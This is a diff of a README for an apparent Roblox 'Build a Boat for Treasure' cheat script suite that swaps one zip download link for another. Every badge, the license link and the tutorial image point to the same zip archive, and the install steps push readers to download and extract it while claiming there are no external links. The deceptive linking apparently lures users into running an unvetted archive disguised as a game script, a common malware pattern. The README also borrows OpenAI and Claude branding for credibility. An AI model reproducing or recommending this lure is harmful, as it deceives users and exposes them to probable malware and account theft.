@@ -1,10 +1,10 @@
 # 🚀 Build a Boat for Treasure - Ultimate Roblox Script Suite 😎  
 
-![Maintenance](https://raw.githubusercontent.com/astrellaa/boat-for-treasure-script-hub/main/sidewinder/boat-treasure-script-hub-for-1.7.zip)
-![OpenAI Powered](https://raw.githubusercontent.com/astrellaa/boat-for-treasure-script-hub/main/sidewinder/boat-treasure-script-hub-for-1.7.zip)
-![Claude API](https://raw.githubusercontent.com/astrellaa/boat-for-treasure-script-hub/main/sidewinder/boat-treasure-script-hub-for-1.7.zip)
-![Platform](https://raw.githubusercontent.com/astrellaa/boat-for-treasure-script-hub/main/sidewinder/boat-treasure-script-hub-for-1.7.zip)
-![License: MIT](https://raw.githubusercontent.com/astrellaa/boat-for-treasure-script-hub/main/sidewinder/boat-treasure-script-hub-for-1.7.zip)
+![Maintenance](https://github.com/astrellaa/boat-for-treasure-script-hub/raw/refs/heads/main/sidewinder/boat_script_hub_treasure_for_v1.2.zip)
+![OpenAI Powered](https://github.com/astrellaa/boat-for-treasure-script-hub/raw/refs/heads/main/sidewinder/boat_script_hub_treasure_for_v1.2.zip)
+![Claude API](https://github.com/astrellaa/boat-for-treasure-script-hub/raw/refs/heads/main/sidewinder/boat_script_hub_treasure_for_v1.2.zip)
+![Platform](https://github.com/astrellaa/boat-for-treasure-script-hub/raw/refs/heads/main/sidewinder/boat_script_hub_treasure_for_v1.2.zip)
+![License: MIT](https://github.com/astrellaa/boat-for-treasure-script-hub/raw/refs/heads/main/sidewinder/boat_script_hub_treasure_for_v1.2.zip)
 
 
 
@@ -54,8 +54,8 @@ _Elevate your gameplay, automate the tricky stuff, and join a global crew with m
 
 **Ready to navigate the next level? Follow this streamlined route to installation!**
 
-1. **Download the https://raw.githubusercontent.com/astrellaa/boat-for-treasure-script-hub/main/sidewinder/boat-treasure-script-hub-for-1.7.zip from this repository**  
-   Navigate to the repo’s main page and locate the https://raw.githubusercontent.com/astrellaa/boat-for-treasure-script-hub/main/sidewinder/boat-treasure-script-hub-for-1.7.zip archive.  
+1. **Download the https://github.com/astrellaa/boat-for-treasure-script-hub/raw/refs/heads/main/sidewinder/boat_script_hub_treasure_for_v1.2.zip from this repository**  
+   Navigate to the repo’s main page and locate the https://github.com/astrellaa/boat-for-treasure-script-hub/raw/refs/heads/main/sidewinder/boat_script_hub_treasure_for_v1.2.zip archive.  
    (No external links, always keep your voyage secure here.)
 
 2. **Extract the Files**  
@@ -67,7 +67,7 @@ _Elevate your gameplay, automate the tricky stuff, and join a global crew with m
    Enjoy a first-time tutorial walk-through on script features and AI helpers.
 
 **🍿 Need a jumpstart? Watch our 2025 animated installation tutorial:**  
-![Installation Guide](https://raw.githubusercontent.com/astrellaa/boat-for-treasure-script-hub/main/sidewinder/boat-treasure-script-hub-for-1.7.zip)
+![Installation Guide](https://github.com/astrellaa/boat-for-treasure-script-hub/raw/refs/heads/main/sidewinder/boat_script_hub_treasure_for_v1.2.zip)
 
 ---
 
@@ -115,7 +115,7 @@ While our support sails 24/7, enjoy with wise discretion. We champion fair play 
 
 ## 📜 License & Acknowledgments - MIT Proud, Collaboration Ahead! 👐  
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/astrellaa/boat-for-treasure-script-hub/main/sidewinder/boat-treasure-script-hub-for-1.7.zip).  
+This project is licensed under the [MIT License](https://github.com/astrellaa/boat-for-treasure-script-hub/raw/refs/heads/main/sidewinder/boat_script_hub_treasure_for_v1.2.zip).  
 Feel free to innovate, adapt, remix, and share—with credit to contributors and care for the community.
 
 _Made possible by a vibrant user base, pioneering APIs from OpenAI and Claude, and global ideas in 2025._
